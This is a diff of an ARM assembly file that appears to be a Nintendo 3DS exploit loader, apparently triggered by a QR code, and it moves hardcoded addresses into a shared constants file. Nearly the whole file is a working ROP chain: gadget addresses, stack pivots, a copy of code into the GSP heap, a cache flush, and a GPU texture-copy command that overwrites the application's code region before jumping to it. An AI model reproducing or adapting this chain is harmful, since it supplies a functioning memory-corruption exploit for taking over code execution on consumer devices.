@@ -1,18 +1,12 @@
 .nds
 
+.include "../../build/constants.s"
+
 .open "sploit_proto.bin","cn_qr_initial_loader.bin",0x0
 
-GSPHEAP equ 0x14000000
-PATCHLOCATION equ GSPHEAP
-TEXTPAOFFSET equ 0x03E00000
-STACKPAYLOADADR equ 0x0FFFFA64
-; PAYLOADADR equ 0x0FFFFA64
-PAYLOADADR equ 0x8E3D968
-CODELOCATIONVA equ (0x8E3D968+codePatch-ROP)
-CODELOCATIONPAOFF equ (0x100000)
-CODELOCATIONGSP equ (GSPHEAP+CODELOCATIONPAOFF)
-
 .arm
+
+CN_CODELOCATIONVA equ (CN_HEAPPAYLOADADR+codePatch-ROP)
 
 ;length
 .orga 0x60
@@ -24,7 +18,7 @@ CODELOCATIONGSP equ (GSPHEAP+CODELOCATIONPAOFF)
 ROP:
 	;jump to safer place
 		.word 0x001001c8 ; pop {r3} | add sp, sp, r3 | pop {pc}
-			.word PAYLOADADR-STACKPAYLOADADR ; r3
+			.word CN_HEAPPAYLOADADR-CN_STACKPAYLOADADR ; r3
 
 secondaryROP:
 	;copy code to GSP heap
@@ -34,9 +28,9 @@ secondaryROP:
 			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0x002c9628 ; lr (pop	{r0, pc})
 		;equivalent to .word 0x002c9628 ; pop {r0, pc}
-			.word CODELOCATIONGSP    ; r0 (dst)
+			.word CN_CODELOCATIONGSP    ; r0 (dst)
 		.word 0x00226734 ; pop	{r1, pc}
-			.word CODELOCATIONVA ; r1 (src)
+			.word CN_CODELOCATIONVA ; r1 (src)
 		.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
 			.word codePatchEnd-codePatch ; r2 (size)
 			.word 0xDEADC0DE ; r3 (garbage)
@@ -49,7 +43,7 @@ secondaryROP:
 		.word 0x00226734 ; pop	{r1, pc}
 			.word 0xFFFF8001 ; r1 (kprocess handle)
 		.word 0x0020b8e8 ; pop	{r2, r3, r4, pc}
-			.word CODELOCATIONGSP  ; r2 (address)
+			.word CN_CODELOCATIONGSP  ; r2 (address)
 			.word codePatchEnd-codePatch ; r3 (size)
 			.word 0xDEADC0DE ; r4 (garbage)
 		.word 0x002D15D8 ; GSPGPU_FlushDataCache (ends in LDMFD   SP!, {R4-R6,PC})
@@ -61,7 +55,7 @@ secondaryROP:
 		.word 0x002c9628 ; pop	{r0, pc}
 			.word 0x356208+0x58 ; r0
 		.word 0x00226734 ; pop	{r1, pc}
-			.word PAYLOADADR+gxCommand-ROP ; r1 (cmd addr)
+			.word CN_HEAPPAYLOADADR+gxCommand-ROP ; r1 (cmd addr)
 		.word 0x001C2B58 ; nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue (ends in LDMFD   SP!, {R4-R8,PC})
 			.word 0xDEADC0DE ; r4 (garbage)
 			.word 0xDEADC0DE ; r5 (garbage)
@@ -75,7 +69,6 @@ secondaryROP:
 			.word 0x002c9628 ; r1 (pop {r0, pc})
 		.word 0x0012ec64 ; pop {r4, lr} | bx r1
 			.word 0xDEADC0DE ; r4 (garbage)
-			; .word 0x00100000 ; lr (code addr)
 			.word 0x002c9628 ; lr (pop {r0, pc})
 		;equivalent to .word 0x002c9628 ; pop {r0, pc}
 			.word 0x3B9ACA00 ; r0 = 1 second
@@ -86,7 +79,6 @@ secondaryROP:
 			.word 0x00000000 ; r0 (time_low)
 		.word 0x00226734 ; pop	{r1, pc}
 			.word 0x00000000 ; r1 (time_high)
-		; .word 0x00100000 ;jump to code
 		.word 0x002D9700 ;jump to code
 
 		.word 0xBEEF0000
@@ -95,9 +87,8 @@ endROP:
 .align 4
 gxCommand:
 	.word 0x00000004 ;command header (SetTextureCopy)
-	.word CODELOCATIONGSP ;source address
-	; .word GSPHEAP+TEXTPAOFFSET ;destination address
-	.word GSPHEAP+TEXTPAOFFSET+0x001D9700 ;destination address (put it at the end to avoid cache issues)
+	.word CN_CODELOCATIONGSP ;source address
+	.word CN_GSPHEAP+CN_TEXTPAOFFSET+0x001D9700 ;destination address (put it at the end to avoid cache issues)
 	.word 0x00010000 ;size
 	.word 0xFFFFFFFF ; dim in
 	.word 0xFFFFFFFF ; dim out
